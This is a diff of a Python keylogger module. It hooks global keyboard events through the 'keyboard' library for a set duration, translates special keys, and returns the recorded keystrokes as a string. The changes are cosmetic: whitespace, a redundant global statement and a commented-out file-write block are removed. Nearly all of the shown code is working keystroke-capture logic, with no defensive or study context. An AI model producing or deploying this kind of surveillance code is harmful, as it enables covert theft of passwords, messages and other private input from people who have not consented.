@@ -20,17 +20,12 @@ spec_key = {
 
 spec_key['space'] = ' '
 
-
 def __parse_key_event(event: KeyboardEvent):
     if event.event_type == keyboard.KEY_UP:
         return ""
-
     res = str(event.name)
-
-    global spec_key
     if res in spec_key:
         res = spec_key[res]
-
     return res
 
 
@@ -41,26 +36,16 @@ def __key_log(duration):
         key = __parse_key_event(event)
         if key:
             logger.append(key)
-
     keyboard.hook(on_key_event)
-
     time.sleep(duration)
     keyboard.unhook_all()
-
-    return ''.join(logger)
+    key = ''.join(logger)
+    return key
 
 
 def get_key_log(duration):
     duration = int(duration)
-
     content = __key_log(duration)
-
-    # try:
-    #     with open('keylogger_file.txt', 'w') as f:
-    #         f.write(content)
-    # except Exception as e:
-    #     print(f"Error writing to file: {e}")
-
     return content
 
 # Example usage:
